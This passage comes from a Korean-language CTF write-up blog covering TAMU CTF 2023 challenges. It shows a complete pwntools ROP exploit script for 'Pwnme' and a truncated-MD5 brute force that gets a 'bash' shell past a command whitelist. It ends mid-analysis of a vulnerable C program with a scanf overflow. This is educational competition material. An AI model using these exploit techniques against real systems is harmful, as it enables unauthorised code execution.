rax, qword ptr [rdi]; ret; </span><br><span class="line">rax = &amp;pwnme</span><br><span class="line">// 0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">rsi = X</span><br><span class="line">// 0x00000000004011b2: sub rax, rsi; ret; </span><br><span class="line">rax = &amp;pwnme - X</span><br><span class="line">// 0x0000000000401010: call rax; </span><br><span class="line">rip = &amp;pwnme - X (win)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line">payload += p64(mov_rax_rdi) <span class="comment"># raxì— ë¦½ì‹œ ì£¼ì†Œê°€ ë“¤ì–´ê°‘ë‹ˆë‹¤</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(sub_rax_rsi)</span><br><span class="line">payload += p64(call_rax)</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ ê¸¸ì´ê°€ 0x10 ì˜¤ë²„ë‚˜ì„œ ì‚¬ìš©í•˜ì§€ ëª»í–ˆë‹¤. ì´ ì•„ì´ë””ì–´ë¡œ ê¸¸ì´ë¥¼ ì¤„ì—¬ë³´ë ¤ë‹¤ê°€ ìž˜ ì•ˆë˜ì–´ì„œ ë‹¤ë¥¸ ì•„ì´ë””ì–´ë¥¼ ìƒê°í–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>rspë¥¼ ìœ„ë¡œ ê³„ì† ì˜¬ë ¤ì„œ ìŠ¤íƒ ê³µê°„ì„ ë§ˆë ¨í•˜ìžëŠ” ìƒê°ì„ í–ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401199                 sub     rsp, 18h</span><br></pre></td></tr></table></figure><p>ìŠ¤íƒ ê³µê°„ì„ ë§ˆë ¨í•´ì„œ ì²«ë²ˆì§¸ ìƒê°í•œ ì•„ì´ë””ì–´ì˜ payloadë¥¼ ë„£ì–´ì„œ <code>ret</code> ê°€ì ¯ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì„ ëª©í‘œë¡œ í–ˆë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pwnme&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwnme&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libpwnme.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40118b</span></span><br><span class="line">mov_rax_rdi = <span class="number">0x401191</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401189</span></span><br><span class="line">sub_rax_rsi = <span class="number">0x4011b2</span></span><br><span class="line">call_rax = <span class="number">0x401010</span></span><br><span class="line">sub_rsp_0x18 = <span class="number">0x401199</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop1 = <span class="number">0x40118a</span></span><br><span class="line"></span><br><span class="line">rop_payload1 = p64(ret)</span><br><span class="line">rop_payload1 += p64(pop_rdi)</span><br><span class="line">rop_payload1 += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop_payload2 = p64(mov_rax_rdi)</span><br><span class="line">rop_payload2 += p64(pop_rsi_r15)</span><br><span class="line">rop_payload2 += p64(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">rop_payload3 = p64(<span class="number">0</span>)</span><br><span class="line">rop_payload3 += p64(sub_rax_rsi)</span><br><span class="line">rop_payload3 += p64(call_rax)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spill</span>(<span class="params">values</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload += p64(sub_rsp_0x18)</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += values</span><br><span class="line">    pause() <span class="comment"># picture</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">spill(rop_payload3)</span><br><span class="line">spill(rop_payload2)</span><br><span class="line">spill(rop_payload1)</span><br><span class="line"></span><br><span class="line">payload = p64(ret)*<span class="number">7</span></span><br><span class="line">payload += p64(pop1)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>spill</code> í•¨ìˆ˜ì—ì„œ payloadì— <code>a*0x10</code>ì„ ì¶”ê°€í•´ì¤€ ì´ìœ ê°€ <code>pwnme</code> í•¨ìˆ˜ì—ì„œ <code>sub     rsp, 10h</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ìˆ˜í–‰í•˜ê¸° ë•Œë¬¸ì— ë„£ì–´ì¤¬ë‹¤. payloadë¥¼ ìˆœì„œëŒ€ë¡œ ê²¹ì¹˜ëŠ” ê²ƒ ì—†ì´ ì •ë ¬ì‹œì¼œì¤˜ì•¼í•˜ê¸° ë•Œë¬¸ì´ë‹¤.<br><code>pop1</code>ì„ í•œ ì´ìœ ëŠ” ì € ìŠ¤íƒ ìƒí™©ì—ì„œ ë³´ì´ëŠ”ê²Œ <code>0x4141414141414141</code>ì˜€ê¸° ë•Œë¬¸ì— í•˜ë‚˜ ë¹¼ì£¼ê³  <code>rsp</code>ë¥¼ ë‚´ë ¤ì¤¬ë‹¤.</p><p>ì•„ëž˜ëŠ” <code>spill</code> í•¨ìˆ˜ì—ì„œ <code>pause()</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>pwnme</code> í•¨ìˆ˜ì˜ <code>read</code>ì— ìž…ë ¥ì„ ë³´ë‚¸ í›„ <code>rsp</code>ë¥¼ ì¶œë ¥í•œ ìƒí™©ì´ë‹¤. <code>rop_payload1</code>ë¥¼ ë³´ë‚¼ ë•Œ ìº¡ì³í–ˆë‹¤.</p><img src="/images/230503-tamu2023-8.Pwnme-pwn/Screenshot 2023-05-03 at 20.05.44.png" width=700/><br><ul><li>ë¹¨ê°„ìƒ‰: <code>pwnme</code> í•¨ìˆ˜ì—ì„œ <code>sub     rsp, 10h</code>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ìˆ˜í–‰í•˜ì—¬ <code>rsp</code>ê°€ ë” ë†’ì•„ì¡Œë‹¤.</li><li>ë…¸ëž€ìƒ‰: <code>read</code> í•¨ìˆ˜ì—ì„œì˜ <code>buf</code> ì›ëž˜ ì‚¬ì´ì¦ˆ + <code>rbp</code></li><li>íŒŒëž€ìƒ‰: payloadë¥¼ ì ê¸° ìœ„í•´ ìŠ¤íƒ ê³µê°„ì„ ë„“ížˆê¸° ìœ„í•´ <code>sub     rsp, 18h</code>ì„ ìˆ˜í–‰í•´ì•¼ í•œë‹¤.</li><li>ì—°ë‘ìƒ‰: <code>rop_payload</code>ê°€ ì œëŒ€ë¡œ ì´ì–´ì§€ê¸° ìœ„í•´ offsetì„ ë§žì¶°ì£¼ê¸° ìœ„í•œ dummyì´ë‹¤.</li><li>ì£¼í™©ìƒ‰: ìŠ¤íƒ ê³µê°„ì´ ë„“ì–´ì¡Œê³ , ë‚˜ë¨¸ì§€ <code>rop_payload</code>ë¥¼ ì¨ì•¼í•˜ëŠ” ê³µê°„ì´ë‹¤. ë’¤ì—ë„ <code>rop_payload</code>ê°€ ì í˜€ìžˆëŠ”ë° ì´ê²ƒê³¼ ì´ì–´ì ¸ì„œ ì¨ì¤˜ì•¼ í•œë‹¤. ê·¸ëž˜ì„œ ì—°ë‘ìƒ‰ì´ ì´ ì´ì–´ì§€ê¸° ìœ„í•œ offsetì„ ë§žì¶”ê¸° ìœ„í•œ dummyê°€ ë“¤ì–´ê°€ì•¼ í•œë‹¤.</li></ul><p>ìŠ¤íƒì— <code>rop_payload</code>ë¥¼ ë‹¤ ì ì–´ì£¼ê³  <code>ret</code>ë¥¼ ì—¬ëŸ¬ë²ˆ ì‹¤í–‰ì‹œì¼œì„œ <code>rsp</code>ë¥¼ <code>rop_payload</code> ìžˆëŠ” ê³³ê¹Œì§€ ë‚´ë ¤ì„œ ì‹¤í–‰ì‹œí‚¤ë©´ ëì´ë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;r0p_g4dg3ts_r_c00l&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - MD5 (crypto, md5 collision)</title>
      <link href="/230503-tamu2023-9.MD5-crypto/"/>
      <url>/230503-tamu2023-9.MD5-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>MD5 jail?!?!?!?!<br>Author: anomie</p></blockquote><ul><li>[114 solves &#x2F; 373 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(whitelisted_hash))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="built_in">hex</span>(u32(whitelisted_hash.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).encode()</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">b&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Goodbye&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5sum(cmd) != whitelisted_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Invalid command, try &quot;<span class="subst">&#123;whitelisted_cmd.decode()&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out = subprocess.check_output([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">            <span class="built_in">print</span>(out.decode())</span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Command returned non-zero exit status <span class="subst">&#123;e.returncode&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ë¬¸ì œ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ <code>md5sum</code> í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë³´ë©´ 3ë°”ì´íŠ¸ë§Œ ë¦¬í„´í•œë‹¤. </p><p>ë¬¸ì œ í’€ì´ì— ì•žì„œ <code>md5 collision</code>ì— ëŒ€í•´ ê°„ë‹¨ížˆ ì‚´íŽ´ë´¤ë‹¤. <code>md5</code>ëŠ” ê°™ì€ ìž…ë ¥ê°’ì´ë©´ í•­ìƒ ê°™ì€ ì¶œë ¥ê°’ì´ ë‚˜ì˜¨ë‹¤. ì„œë¡œ ë‹¤ë¥¸ ê°’ì„ ìž…ë ¥í•  ê²½ìš° ê°™ì€ ì¶œë ¥ê°’ì´ ë‚˜ì˜¬ í™•ë¥ ì€ êµ‰ìž¥ížˆ ë‚®ì§€ë§Œ ê°™ì€ ê°’ì´ ë‚˜ì˜¬ ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤. ì˜ˆë¥¼ ë“¤ë©´ <code>AAAA</code>ì™€ <code>BBBB</code>ì˜ <code>md5</code>ë¥¼ ì ìš©í–ˆì„ ë•Œ ì¶œë ¥ê°’ì´ ê°™ì„ ìˆ˜ë„ ìžˆë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤. ì´ëŸ° ìƒí™©ì„ <code>md5 collision</code>ì´ë¼ê³  í•œë‹¤. </p><p>ë¬¸ì œ ìŠ¤í¬ë¦½íŠ¸ëŠ” â€˜echo lmaoâ€™ë¥¼ <code>md5sum</code> í•¨ìˆ˜ë¥¼ ê±°ì¹œ í›„ì˜ ê°’ê³¼ ê°™ìœ¼ë©´ ìž…ë ¥ê°’ì„ <code>bash</code>ë¡œ ì‹¤í–‰í•  ìˆ˜ ìžˆë‹¤. ë§‰ë§‰í•´ë³´ì´ì§€ë§Œ ì‚¬ì‹¤ <code>md5sum</code> í•¨ìˆ˜ì—ì„œì˜ ì „ì²´ í•´ì‹œê°’ì˜ 3ë°”ì´íŠ¸ë§Œ ë˜‘ê°™ì€ ìž…ë ¥ê°’ì„ ì°¾ìœ¼ë©´ ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ë‚˜ëŠ” ì‰˜ì„ íšë“í•˜ê¸° ìœ„í•´ <code>bash #</code>ì„ ê³ ì •ìœ¼ë¡œ ë‘ê³  <code>#</code> ì£¼ì„ ë’¤ì— ìˆ«ìžë¥¼ ì ì–´ì¤˜ì„œ ë¸Œë£¨íŠ¸í¬ì‹±ìœ¼ë¡œ <code>md5</code> í•´ì‹œê°€ 3ë°”ì´íŠ¸ë§Œ ë˜‘ê°™ì€ ê²½ìš°ë¥¼ ì°¾ìœ¼ë ¤ê³  í–ˆê³ , ì„±ê³µí–ˆë‹¤!</p><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;md5&quot;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;&gt;&#x27;,&#x27;bash # 2695494&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000000000</span>):</span><br><span class="line">    input_cmd = <span class="string">b&#x27;bash # &#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">    input_hash = md5sum(input_cmd)</span><br><span class="line">    <span class="comment"># print(repr(hex(u32(input_hash.ljust(4, b&#x27;\x00&#x27;)))))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_hash != whitelisted_hash:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;###############################################&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(input_cmd)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ cat flag.txt &gt;&amp;2</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;3_bYt3_MD5_1s_Ju5t_pr00f_0f_W0rK&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Sea Shells (pwn, shellcode)</title>
      <link href="/230503-tamu2023-5.Sea_Shells-pwn/"/>
      <url>/230503-tamu2023-5.Sea_Shells-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Sally sold some seashells by the seashore. Try to guess how many she sold, I bet you will never be able to!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[74 solves &#x2F; 447 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ì½”ë“œê°€ ì œê³µëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><code>NX disabled</code>ì´ê¸° ë•Œë¬¸ì— shellcode ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">unsigned</span> <span class="type">long</span> sold)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((n &amp; <span class="number">0xffff</span>) == (sold &amp; <span class="number">0xffff</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> num_sold;</span><br><span class="line">    <span class="type">char</span> resp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> c;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> d;</span><br><span class="line">    </span><br><span class="line">    num_sold = rand();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s not that easy though, enter 4 numbers to use to guess!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// ask user for input</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4th number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;d);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// perform some calculations on the numbers</span></span><br><span class="line">        d = d + c;</span><br><span class="line">        c = c ^ b;</span><br><span class="line">        b = b - a;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (check(d, num_sold)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Woohoo! That&#x27;s exactly how many she sold!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a little something Sally wants to give you for your hard work: %lx\n&quot;</span>, &amp;d);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Sorry, that&#x27;s not quite right :(\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// go again?</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (resp == <span class="string">&#x27;Y&#x27;</span> || resp == <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sally sold some sea SHELLS!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try to guess exactly how many she sold, I bet you can&#x27;t!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;bye now&#x27;\n-Sally\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì•„ëž˜ì—ì„œ bofê°€ ë°œìƒí•œë‹¤. ì™œëƒë©´ <code>%s</code>ë¡œ ìž…ë ¥ë°›ê¸° ë•Œë¬¸.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br></pre></td></tr></table></figure><p>ê·¸ ì „ì— <code>check(d, num_sold)</code>ì„ í†µê³¼í•˜ë©´ <code>d</code> ë³€ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì•Œë ¤ì¤€ë‹¤. ì´ ì£¼ì†ŒëŠ” ìŠ¤íƒ ì£¼ì†Œì´ê¸° ë•Œë¬¸ì— ì“¸ë°ê°€ ë§Žë‹¤. <code>check(d, num_sold)</code>ì„ í†µê³¼í•˜ê¸° ìœ„í•´ <code>num_sold = rand();</code>ì„ ì˜ˆìƒí•´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” <code>seed</code>ê°€ 